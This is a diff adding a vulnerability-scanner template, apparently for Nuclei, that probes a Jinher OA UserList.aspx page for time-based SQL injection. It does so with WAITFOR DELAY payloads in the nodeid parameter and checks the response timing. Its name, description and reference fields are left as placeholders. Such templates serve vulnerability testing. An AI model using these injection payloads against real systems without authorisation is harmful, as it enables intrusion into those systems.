@@ -1,0 +1,26 @@
+id: jinher-UserList-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--"
+      - "{{BaseURL}}/c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--"
+      - "{{BaseURL}}/c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3BWAITFOR+DELAY+%270%3A0%3A9%27--"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
